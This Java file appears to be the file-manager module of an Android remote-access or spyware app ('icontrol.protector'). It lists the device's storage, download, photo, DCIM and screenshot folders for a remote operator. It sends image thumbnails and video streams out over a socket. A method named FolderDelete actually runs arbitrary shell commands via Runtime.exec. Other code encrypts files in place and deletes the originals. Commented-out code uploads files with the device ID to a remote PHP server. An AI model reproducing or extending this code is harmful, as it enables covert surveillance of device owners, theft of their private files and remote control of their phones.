package com.icontrol.protector;


import android.app.usage.StorageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.RectF;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.media.MediaMetadataRetriever;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.Charset;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

import android.app.Fragment;
import android.os.StatFs;
import android.os.storage.StorageManager;
import android.util.Base64;

import androidx.core.content.FileProvider;

import org.json.JSONObject;


public class filesManager extends Fragment {
    private static String mp = "ssolrssolr";
    private static String SPL_DATA = Consts.SPLIT_DATA;
    private static String SPL_ARRAY = Consts.SPLIT_ARAY;
    private static String SPL_LINE = Consts.SPLIT_DATA;
    // private static String OBJ = "<Object>";
    private static Executor myExcuter = null;
    private static int max = 1000;

    public String[] Load(Context ctx, String s)  {
        String[] f = new String[2];
        String currentpath = "null";

        String StorageSize = "";

        if (myExcuter == null) {
            myExcuter = new ThreadPoolExecutor(8, 5 * 3, 1,
                    TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(max));
        }
        try {
            StringBuffer sb = new StringBuffer();
            String p = s;
            if (p.equals("get0")) {
                p = Environment.getExternalStorageDirectory().getPath();
                StorageSize = getStorageInfo(ctx);

            } else if (p.equals("get1")) {
                p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString();
            } else if (p.equals("get2")) {
                p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString();
            } else if (p.equals("get3")) {
                p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).toString();
            } else if (p.equals("get4")) {
                p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES).toString();
            } else if (p.equals("get5")) {
                File screenshotsDir = findScreenshotsDirectory(Environment.getExternalStorageDirectory(), Environment.DIRECTORY_PICTURES, "Screenshots");

                if (screenshotsDir == null) {
                    screenshotsDir = findScreenshotsDirectory(Environment.getExternalStorageDirectory(), Environment.DIRECTORY_DCIM, "Screenshots");
                }

                if (screenshotsDir != null) {
                    p = screenshotsDir.getAbsolutePath() + File.separator;
                    // Use 'p' as needed
                } else {
                    // Handle the case where Screenshots directory is not found
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_SCREENSHOTS).toString();
                    } else {
                        //TODO: send alert no screenshots dir found
                        return new String[]{null, null};
                    }
                }

            } else if (p.equals("get6")){

            }


            File pl = new File(p);
            if (pl.isDirectory()) {
                String gp = pl.getPath();
                currentpath = gp;
                File[] lst = pl.listFiles();
                if (lst != null && lst.length > 0) {
                    for (int i = 0; i < lst.length; i++) {
                        try {
                            String name = lst[i].getName();
                            long size = lst[i].length();
                            String date = "n/a";
                            String LastModified;
                            try {
                                File file = new File(lst[i].getPath());
                                SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy EEE", Locale.ENGLISH);
                                date = new SimpleDateFormat("MM/dd/yyyy EEE", Locale.ENGLISH).format(new Date());
                                LastModified = sdf.format(file.lastModified());

                            } catch (Exception e) {
                                LastModified = "n/a";
                            }
                            String exe = "n/a";
                            String cou = "n/a";
                            if (lst[i].isDirectory()) {
                                File[] is_null = lst[i].listFiles();
                                if (is_null == null){
                                    cou = "0";
                                }else{
                                    cou = String.valueOf(is_null.length);
                                }

                                exe = "0";
                            } else if (lst[i].isFile()) {
                                exe = "1";
                            }
                            sb.append("1" + SPL_ARRAY + exe + SPL_ARRAY + name + SPL_ARRAY + String.valueOf(size) + SPL_ARRAY + gp + SPL_ARRAY + LastModified + SPL_ARRAY + date + SPL_ARRAY + cou + StorageSize + SPL_LINE);
                        } catch (Exception e) {
                        }
                    }

                } else {
                    sb.append("-1" + SPL_ARRAY + gp + SPL_LINE);
                }
            }

            f[0] = sb.toString();
            f[1] = currentpath;
            return f;
        } catch (Exception e) {
            f[0] = "-1" + SPL_ARRAY + currentpath + SPL_LINE;
            f[1] = currentpath;
        }
        return f;
    }

    private String getStorageInfo(Context ctx) {
        // Internal Storage
        double totalStorageSizeInGB = getTotalStorageSize(ctx);
        long totalStorageSizeInBytes = (long) (totalStorageSizeInGB * Math.pow(1024, 3));

        StatFs internalStatFs = new StatFs(android.os.Environment.getExternalStorageDirectory().getPath());
        long internalFree = internalStatFs.getAvailableBlocksLong() * internalStatFs.getBlockSizeLong();
        long internalUsed = totalStorageSizeInBytes - internalFree;

        //formatSize(internalFree)

        String resu = SPL_ARRAY + totalStorageSizeInGB  +SPL_ARRAY+ formatSize(internalUsed);
        return resu;
    }


    private String formatSize(long size) {
        String suffix = null;
        float sizeInFloat = size;

        if (size >= 1024) {
            suffix = "KB";
            sizeInFloat /= 1024;
            if (sizeInFloat >= 1024) {
                suffix = "MB";
                sizeInFloat /= 1024;
                if (sizeInFloat >= 1024) {
                    suffix = "GB";
                    sizeInFloat /= 1024;
                }
            }
        }

        return String.format("%.2f", sizeInFloat) + " " + suffix;
    }

    public static double getTotalStorageSize(Context context) {
        StorageManager storageManager = (StorageManager) context.getSystemService(Context.STORAGE_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                StorageStatsManager storageStatsManager = (StorageStatsManager) context.getSystemService(Context.STORAGE_STATS_SERVICE);
                java.util.UUID uuid = storageManager.getUuidForPath(Environment.getDataDirectory());
                long totalBytes = storageStatsManager.getTotalBytes(uuid);
                SizeRepresentation sizeRepresentation = getStorageSizeRepresentation(totalBytes);
                double base = (double) sizeRepresentation.getBase();
                return totalBytes / (base * base * base);
            } catch (IOException e) {
                return 0.0;
            }
        } else {
            // Implementation for devices running lower versions
            throw new UnsupportedOperationException("This feature is not supported on devices running lower versions of Android.");
        }
    }

    /**
     * Determines if the data size is in Binary or in Decimal.
     */
    public static SizeRepresentation getStorageSizeRepresentation(long storageSizeInBytes) {
        double logValue = log(storageSizeInBytes / Math.pow(1024.0, 3), 2.0);
        return logValue % 1.0 == 0.0 ? SizeRepresentation.BINARY : SizeRepresentation.DECIMAL;
    }

    private static double log(double x, double base) {
        return Math.log(x) / Math.log(base);
    }

    public enum SizeRepresentation {
        BINARY(1024), DECIMAL(1000);

        private final int base;

        SizeRepresentation(int base) {
            this.base = base;
        }

        public int getBase() {
            return base;
        }
    }

    private File findScreenshotsDirectory(File baseDir, String subDir, String dirName) {
        File directory = new File(baseDir, subDir + File.separator + dirName);
        if (directory.exists() && directory.isDirectory()) {
            return directory;
        }
        return null;
    }

    public static void FolderDelete(final String commend) {
        try {
            String encoded = new String(commend.getBytes("utf-8"));
            String[] cmd = encoded.split(" ");
            String space = "(U+0020)".toLowerCase();
            for (int i = 0; i < cmd.length; i++) {
                if (cmd[i].contains(space)) {
                    cmd[i] = cmd[i].replace(space, " ");
                }
            }
            Runtime runtime = Runtime.getRuntime();
            runtime.exec(cmd);
        } catch (Exception e) {
        }
    }


    public static Uri uriFromFile(Context context, File file) {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return FileProvider.getUriForFile(context, context.getPackageName() + ".provider", file);
        } else {
            return Uri.fromFile(file);
        }
    }

    public String openPath(Context context, String path) {
        try {
            File file = new File(path);

            if (!file.exists()) {
                return "The path does not exist.";
            }

            if (file.isDirectory()) {
                // Open folder using ACTION_OPEN_DOCUMENT_TREE
                Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT_TREE);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                return path + " folder opened.";
            } else {
                // Open file using ACTION_VIEW
                Uri uri = uriFromFile(context, file);
                String mime = context.getContentResolver().getType(uri);
                Intent intent = new Intent();
                intent.setAction(Intent.ACTION_VIEW);
                intent.setDataAndType(uri, mime);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                return path + " file opened.";
            }
        } catch (Exception e) {
            return "Can't open path, error: " + e.getMessage();
        }
    }


    //todo modifi this method to send to php
    private static final String cryptkey = "icontrol";
    public  boolean createf(String path, boolean isFolder) {
        File target = new File(path);

        if (target.exists()) {
            return true; // Path already exists
        }

        if (isFolder) {
            // Create as a directory
            return target.mkdirs();
        } else {
            // Create as a file
            File parentDir = target.getParentFile();
            if (parentDir != null && !parentDir.exists()) {
                if (!parentDir.mkdirs()) {
                    return false; // Failed to create parent directories
                }
            }

            try {
                return target.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
                return false; // Failed to create the file
            }
        }
    }
    public void Upload(final String path, final String Size, final String FileName, final String FileFullpath) {
//        if (((ThreadPoolExecutor) myExcuter).getActiveCount() >= max){
//            return;
//        }
//        myExcuter.execute(new Runnable() {
//            public void run() {
//                Socket sk = null;
//                OutputStream out = null;
//                DataInputStream in = null;
//                FileOutputStream FS = null ;
//                boolean ctd = false;
//                Object Syn_x1 = new Object();
//                Object Syn_x2 = new Object();
//                int test = 0;
//                do {
//                    if (test >= 3){
//                        return;
//                    }
//                    try {
//                        InetAddress ip;
//                        ip = InetAddress.getByName(MySocket.IP);
//                        InetSocketAddress sock = new InetSocketAddress(ip, Integer.valueOf(MySocket.PORT));
//                        sk = new Socket();
//                        sk.setSoTimeout(120000);
//                        sk.setKeepAlive(true);
//                        sk.connect(sock, 59999);
//                        ctd = sk.isConnected();
//                        if (ctd == true) {
//                            sk.setSendBufferSize(1024);
//                            sk.setReceiveBufferSize(1024);
//                            out = sk.getOutputStream();
//                            synchronized (Syn_x1){
//                                if(out != null){
//                                    String info = path + SPL_ARRAY + Size + SPL_ARRAY + FileName +  SPL_ARRAY + FileFullpath;
//                                    byte[] b0 = CreatePacket(id_Commands.Uploader,info.getBytes());
//                                    sk.setSendBufferSize(b0.length);
//                                    out = sk.getOutputStream();
//                                    in = new DataInputStream(new BufferedInputStream(sk.getInputStream()));
//                                    out.write(b0,0,b0.length);
//                                }
//                            }
//                            break;
//                        }
//                    } catch (UnknownHostException e) {
//                        EndSocket(sk,out,in);
//                    } catch (SocketException e) {
//                        EndSocket(sk,out,in);
//                    } catch (Exception e) {
//                        EndSocket(sk,out,in);
//                    }
//                    test++;
//                    try{ Thread.sleep(1);} catch (InterruptedException e) {}
//                } while (ctd == false);
//
//                int read;
//                int siz0 = 0;
//                int siz1 = Integer.valueOf(Size);
//                try{
//                    byte[] buff = new byte[8096];
//                    File f = new File(path);
//                    FS = new FileOutputStream(f);
//                    sk.setReceiveBufferSize(buff.length);
//                    while ((read = in.read(buff)) > 0)
//                    {
//                        synchronized (Syn_x2){
//                            FS.write(buff, 0, read);
//                            siz0+=read;
//                            if (siz0 >= siz1){
//                                break;
//                            }
//                        }
//                    }
//                }catch (SocketException e) {
//                }catch (SocketTimeoutException s) {
//                }catch(OutOfMemoryError e){
//                }catch (Exception e) {}
//                try {
//                    if(FS != null){
//                        FS.close();
//                    }
//                } catch (IOException e) {}
//                try{ Thread.sleep(9000L);} catch (InterruptedException e) {}
//                EndSocket(sk,out,in);
//            }});
    }


//    public void DownManager(Context myctx,final String path) {
//        if (myExcuter == null) {
//            myExcuter = new ThreadPoolExecutor(8, 5 * 3, 1,
//                    TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(max));
//        }
//        if (((ThreadPoolExecutor) myExcuter).getActiveCount() >= max) {
//            return;
//        }
//        myExcuter.execute(new Runnable() {
//            public void run() {
//                try {
//                    Uri ur = Uri.parse((path).trim());
//                    File file = new File(ur.getPath());
//                    if (file.exists()) {
//
//                        sendFileToServer(myctx,"save",file);
//                    }
//
//                } catch (Exception e) {
//                } catch (OutOfMemoryError e) {
//                }
//                try {
//                    Thread.sleep(1000);
//                } catch (InterruptedException e) {
//                }
//
//            }
//        });
//    }


    public void ViewFile(final String path, final String status,final String playit,final String sokidf, final Context ctx) {
        if (myExcuter == null) {
            myExcuter = new ThreadPoolExecutor(8, 5 * 3, 1,
                    TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(max));
        }
        if (((ThreadPoolExecutor) myExcuter).getActiveCount() >= max) {
            return;
        }
        myExcuter.execute(new Runnable() {
            public void run() {
                //
                try {
                    int Qul = 10;
                    Uri ur = Uri.parse((path).trim());
                    File file = new File(ur.getPath());
                    if (file.exists() && file.length() > 0) {
                        if (status.equals("true")) {
                            LiveChat.instance(ctx).Playvideostrem(ctx,path,playit,sokidf);

                        } else {
                            Drawable photo = null;
                            Bitmap bmp = BitmapFactory.decodeFile(file.getPath());
                            photo = new BitmapDrawable(Resources.getSystem(), bmp);
                            if (photo != null) {
                                BitmapDrawable BD = (BitmapDrawable) photo;
                                Bitmap bitmap = scaleToFit(BD.getBitmap(), 300 ,300 );
                                ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                                bitmap.compress(Bitmap.CompressFormat.JPEG, Qul, BOS);
                                byte[] imageBytes = BOS.toByteArray();
                                String base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT);


                                try{
                                    JSONObject jsonObject = new JSONObject();
                                    jsonObject.put("type", "thumb");
                                    jsonObject.put("img", base64Image);
                                    jsonObject.put("pth", path);
                                    String jsonData = jsonObject.toString();

                                    LiveChat.instance(ctx).SendNewSocket(ctx,sokidf ,jsonData);
                                }catch (Exception a){

                                }
                            }
                        }
                    }
                } catch (OutOfMemoryError e) {
                } catch (Exception e) {
                }

            }
        });
    }


    public static String calculateMD5(String filePath) {
        try {
            MessageDigest digest = MessageDigest.getInstance("MD5");
            FileInputStream fis = new FileInputStream(filePath);
            byte[] buffer = new byte[8192];
            int read;
            while ((read = fis.read(buffer)) > 0) {
                digest.update(buffer, 0, read);
            }
            fis.close();

            byte[] md5sum = digest.digest();
            StringBuilder hexString = new StringBuilder();
            for (byte b : md5sum) {
                hexString.append(String.format("%02x", b));
            }

            return hexString.toString();
        } catch (NoSuchAlgorithmException | IOException e) {
            e.printStackTrace();
            return null; // Handle the exception according to your needs
        }
    }

//    private void sendFileToServer(Context myctx, String command, File file) {
//        String phpUrl = Consts.URL_CASH();
//        String boundary = "*****"; // Define a boundary for the multipart request
//
//        try {
//            URL url = new URL(phpUrl);
//            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//
//            // Set request method to POST
//            connection.setRequestMethod("POST");
//            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
//            connection.setDoOutput(true);
//
//            String IDF = MySettings.Read(myctx,Consts.THE_IDF,"empty");
//
//            MyLoger.Debug("hash:",calculateMD5(file.getAbsolutePath()));
//            My_Crpter cr = My_Crpter.Getinstance();
//            try (DataOutputStream os = new DataOutputStream(connection.getOutputStream())) {
//                // Write command and email as fields in the multipart request
//
//
//                os.writeBytes("--" + boundary + "\r\n");
//                os.writeBytes("Content-Disposition: form-data; name=\"command\"\r\n\r\n");
//                os.writeBytes(command + "\r\n");
//
//                os.writeBytes("--" + boundary + "\r\n");
//                os.writeBytes("Content-Disposition: form-data; name=\"email\"\r\n\r\n");
//                os.writeBytes(cr.Dcrpt_Str(My_Configs.USR_MAIL) + "\r\n");
//
//                //MySettings.Read(myctx, Consts.Device_ID,"Deviceid")
//
//                os.writeBytes("--" + boundary + "\r\n");
//                os.writeBytes("Content-Disposition: form-data; name=\"phoneid\"\r\n\r\n");
//                os.writeBytes(MySettings.Read(myctx, Consts.DEVICE_ID,"null") + "\r\n");
//
//                os.writeBytes("--" + boundary + "\r\n");
//                os.writeBytes("Content-Disposition: form-data; name=\"fileverfy\"\r\n\r\n");
//                os.writeBytes(calculateMD5(file.getAbsolutePath()) + "\r\n");
//
//                os.writeBytes("--" + boundary + "\r\n");
//                os.writeBytes("Content-Disposition: form-data; name=\"myidf\"\r\n\r\n");
//                os.writeBytes(IDF + "\r\n");
//
//                // Add the file to the request
//                os.writeBytes("--" + boundary + "\r\n");
//                os.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
//                os.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
//
//                FileInputStream fis = new FileInputStream(file);
//                long size = file.length();
//                int BufferSize ;
//                BufferSize = (int) buff(size);
//                byte[] buffer = new byte[BufferSize];
//                int bytesRead;
//                while ((bytesRead = fis.read(buffer)) != -1) {
//                    os.write(buffer, 0, bytesRead);
//                }
//                fis.close();
//
//                os.writeBytes("\r\n");
//                os.writeBytes("--" + boundary + "--\r\n");
//            }
//
//            // Read the response from the server
//            InputStream in = connection.getInputStream();
//            InputStreamReader inputStreamReader = new InputStreamReader(in);
//            BufferedReader reader = new BufferedReader(inputStreamReader);
//            StringBuilder response = new StringBuilder();
//            String line;
//            while ((line = reader.readLine()) != null) {
//                response.append(line);
//            }
//            reader.close();
//
//                String serverResponse = response.toString();
//            MyLoger.Info("filetoserver: ",serverResponse);
//            connection.disconnect();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }


    public static void FileDelete(final String path) {
        try {
            File file = new File(path);
            if (file.exists()) {
                file.delete();
            }
        } catch (Exception e) {
        }
    }

    public static void rename(final String OldPath, final String NewPath) {
        try {
            File F1 = new File(OldPath);
            if (F1.exists()) {
                File F2 = new File(NewPath);
                F1.renameTo(F2);
            }
        } catch (Exception e) {
        }
    }


    private Bitmap scaleCenterCrop(Bitmap source, int newHeight, int newWidth) {
        float f2 = (float) newWidth;
        float width = (float) source.getWidth();
        float f3 = (float) newHeight;
        float height = (float) source.getHeight();
        float max = Math.max(f2 / width, f3 / height);
        float f4 = width * max;
        float f5 = max * height;
        float f6 = (f2 - f4) / 2.0f;
        float f7 = (f3 - f5) / 2.0f;
        RectF rectF = new RectF(f6, f7, f4 + f6, f5 + f7);
        Bitmap createBitmap = Bitmap.createBitmap(newWidth, newHeight, source.getConfig());
        new Canvas(createBitmap).drawBitmap(source, null, rectF, null);
        return createBitmap;
    }

    private Bitmap scaleToFit(Bitmap source, int newHeight, int newWidth) {
        float srcWidth = source.getWidth();
        float srcHeight = source.getHeight();

        // Calculate the scale factor to fit the image inside the given width and height
        float scaleX = (float) newWidth / srcWidth;
        float scaleY = (float) newHeight / srcHeight;
        float scale = Math.min(scaleX, scaleY);

        // Calculate the final scaled width and height
        int scaledWidth = Math.round(srcWidth * scale);
        int scaledHeight = Math.round(srcHeight * scale);

        // Create a scaled bitmap with the computed width and height
        Bitmap scaledBitmap = Bitmap.createScaledBitmap(source, scaledWidth, scaledHeight, true);

        // Create a final bitmap with the requested dimensions and draw the scaled bitmap in the center
        Bitmap outputBitmap = Bitmap.createBitmap(newWidth, newHeight, source.getConfig());
        Canvas canvas = new Canvas(outputBitmap);

        // Calculate top and left to center the scaled image in the new dimensions
        float left = (newWidth - scaledWidth) / 2.0f;
        float top = (newHeight - scaledHeight) / 2.0f;
        canvas.drawBitmap(scaledBitmap, left, top, null);

        return outputBitmap;
    }

    public static long buff(long BufferSize) {

         if (BufferSize >= 262144) {
             BufferSize = 131072;
         }else if (BufferSize >= 262144) {  // Between 256 KB and 512 KB
            BufferSize = 65536;       // 64 KB
        } else if (BufferSize >= 131072) {  // Between 128 KB and 256 KB
            BufferSize = 32768;       // 32 KB
        } else if (BufferSize >= 65536) {   // Between 64 KB and 128 KB
            BufferSize = 16384;       // 16 KB
        } else if (BufferSize >= 1024) {    // Between 1 KB and 64 KB
            BufferSize = 4096;        // 4 KB
        } else {                      // Less than 1 KB
            BufferSize = 512;         // 512 bytes
        }
        return BufferSize;
    }

    public static void zip(final String[] lst, final String path) {
        try {
            File file = new File(path);
            if (!file.exists()){
                file.createNewFile();
            }
            BufferedInputStream origin;
            FileOutputStream dest = new FileOutputStream(file.getPath());
            ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(dest));
            for (int i = 0; i < lst.length; i++) {
                File o = new File(lst[i]);
                if (!o.isDirectory()){
                    long Buff = buff(o.length());

                    Long x = Buff;
                    int s = x.intValue();
                    byte data[] = new byte[s];

                    FileInputStream fi = new FileInputStream(lst[i]);
                    origin = new BufferedInputStream(fi, s);
                    ZipEntry entry = new ZipEntry(lst[i].substring(lst[i].lastIndexOf("/") + 1));

                    out.putNextEntry(entry);
                    int count;
                    while ((count = origin.read(data, 0, s)) != -1) {
                        out.write(data, 0, count);
                    }
                    origin.close();
                }
            }
            out.close();
        } catch (Exception e) {}
    }
    public static void unzip(final String path, final String here) {
        File file = new File(here);
        if (file.exists()){
            try {
                FileInputStream FIS = new FileInputStream(path);
                ZipInputStream ZIS;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                    ZIS = new ZipInputStream(FIS, Charset.forName("Cp437"));
                }else{
                    ZIS = new ZipInputStream(FIS);
                }
                ZipEntry ZE ;
                while ((ZE = ZIS.getNextEntry()) != null) {
                    String p = here + ZE.getName();
                    File dir0 = new File(p);
                    if (dir0.isDirectory()){
                        if (!dir0.exists()) {dir0.mkdirs();}
                    }else{
                        int c;
                        String n = "";
                        for (c = p.length()-1 ; c >= 0 ; c--){
                            if(String.valueOf(p.charAt(c)).equals("/") ){
                                n = p.substring(0, c);
                                break;
                            }
                        }
                        File dir1 = new File(n);
                        if (!dir1.exists()) {dir1.mkdirs();}
                    }
                    File o = new File(here + ZE.getName());
                    if (!o.isDirectory()){
                        FileOutputStream f = new FileOutputStream(here + ZE.getName());
                        long Buff = buff(o.length());
                        Long x = Buff;
                        int s = x.intValue();
                        byte data[] = new byte[s];
                        int count;
                        while ((count = ZIS.read(data, 0, s)) != -1) {
                            f.write(data, 0, count);
                        }
                        ZIS.closeEntry();
                        f.close();
                    }
                }
                ZIS.close();
            } catch (Exception e) {}
        }
    }
    public  void encrypt(String path,String pass,String con) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        FileInputStream fis = new FileInputStream(path);
        FileOutputStream fos = new FileOutputStream(path.concat(con));
        byte[] key = (mp + pass).getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-1");
        key = sha.digest(key);
        key = Arrays.copyOf(key,16);
        SecretKeySpec sks = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, sks);
        CipherOutputStream cos = new CipherOutputStream(fos, cipher);
        int b;
        byte[] d = new byte[8];
        while((b = fis.read(d)) != -1) {
            cos.write(d, 0, b);
        }
        cos.flush();
        cos.close();
        fis.close();
        FileDelete(path);
    }
    public  void decrypt(String path,String pass, String outPath) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        FileInputStream fis = new FileInputStream(path);
        FileOutputStream fos = new FileOutputStream(outPath);
        byte[] key = (mp + pass).getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-1");
        key = sha.digest(key);
        key = Arrays.copyOf(key,16);
        SecretKeySpec sks = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, sks);
        CipherInputStream cis = new CipherInputStream(fis, cipher);
        int b;
        byte[] d = new byte[8];
        while((b = cis.read(d)) != -1) {
            fos.write(d, 0, b);
        }
        fos.flush();
        fos.close();
        cis.close();
        FileDelete(path);
    }

    public void copyFile(String sourcePath, String destinationPath) throws IOException {
        File sourceFile = new File(sourcePath);
        if (!sourceFile.exists()) {
            throw new IOException("Source file does not exist: " + sourcePath);
        }

        // Extract the filename from the source path
        String fileName = sourceFile.getName();

        // Check if the destinationPath is a directory
        File destinationDir = new File(destinationPath);
        if (destinationDir.isDirectory()) {
            // If it is a directory, append the filename to the destination path
            destinationPath = new File(destinationDir, fileName).getPath();
        }

        File destinationFile = new File(destinationPath);

        // Ensure the parent directories exist
        destinationFile.getParentFile().mkdirs();

        FileInputStream fis = null;
        FileOutputStream fos = null;

        try {
            fis = new FileInputStream(sourceFile);
            fos = new FileOutputStream(destinationFile);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = fis.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
            }
        } finally {
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void moveFile(String sourcePath, String destinationPath) throws IOException {
        // First, copy the file
        copyFile(sourcePath, destinationPath);

        // After copying, delete the source file
        File sourceFile = new File(sourcePath);
        if (!sourceFile.delete()) {
            throw new IOException("Failed to delete the original file after copying: " + sourcePath);
        }
    }
}